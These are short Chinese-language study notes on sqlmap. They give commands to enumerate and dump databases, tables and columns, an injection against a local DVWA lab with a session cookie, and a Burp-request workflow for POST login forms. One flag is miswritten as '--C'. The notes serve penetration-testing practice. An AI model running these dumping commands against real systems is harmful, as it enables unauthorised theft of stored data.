# sqlmap

## sqlmap直接注入

```shell
sqlmap -u http://example.com --dbs
# 跑库
sqlmap -u http://example.com -D 数据库名 --tables
# 跑指定库中表
sqlmap -u http://example.com -D 数据库名 -T 表名 --columns
# 跑指定库中指定表中列
sqlmap -u http://example.com -D 数据库名 -T 表名 --C 列名 --dump
# 跑指定库中指定表中指定列中的值


sqlmap -u http://example.com --dump
# 全输出
```

```shell
# get方法递交查询参数
sqlmap -u 
"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit" 
--cookie="security=low; PHPSESSID=ppuucmoddjbj5cg5kmo49g3v8s"
```

## 报头为POST,无法直接注入

    例:登录
    ①burp抓包,另存到安装目录下
    ②sqlmap -r filename --dbs -p user
    ｜ -p为指定漏洞点,后跟具体发现漏洞点
    ③一致.替换-u为-r
